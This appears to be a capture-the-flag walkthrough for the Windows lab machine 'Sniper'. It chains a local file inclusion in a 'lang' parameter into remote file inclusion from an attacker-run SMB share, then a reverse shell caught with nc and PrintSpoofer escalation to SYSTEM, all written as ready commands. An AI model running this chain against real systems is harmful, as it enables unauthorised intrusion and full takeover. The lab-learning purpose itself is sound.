# Sniper - Walkthrough (Windows)

## 🧗 Initial Foothold

### 🌐 1. Web Discovery
- Found a **register** option on port 80.
- Navigated to `/blog/`, changed language from toolbar (e.g., "English").
- Observed a **`lang` parameter**, vulnerable to **LFI (Local File Inclusion)**.

### 📝 2. LFI to Read System Files
```bash
curl "http://10.129.187.42/blog/?lang=/windows/win.ini"
```

### ⚔️ 3. Remote File Inclusion via SMB
- Set up SMB server:
```bash
impacket-smbserver ninjafolder $(pwd) -smb2support
```

- Created `shell.php` with reverse shell payload (pointing back to your IP).
- Started a listener:
```bash
sudo nc -nlvp 80
```

- Triggered reverse shell:
```
http://10.129.187.42/blog/?lang=\\10.10.16.21\ninjafolder\shell.php
```

- Reverse shell opened.

---

## ⚙️ Privilege Escalation

### 🔍 1. Basic Recon
```bash
whoami
cd %TEMP%
```

### 🧨 2. PrintSpoofer
- Uploaded and executed `PrintSpoofer64.exe`:
```bash
PrintSpoofer64.exe -i -c cmd
```

- Got **NT AUTHORITY\SYSTEM** shell.

---

## 🧠 Notes

- LFI via UNC path lets Windows fetch files from your SMB share.
- SMB must be version 2+ for modern Windows machines.
- PrintSpoofer + SeImpersonatePrivilege is a golden combo when possible.
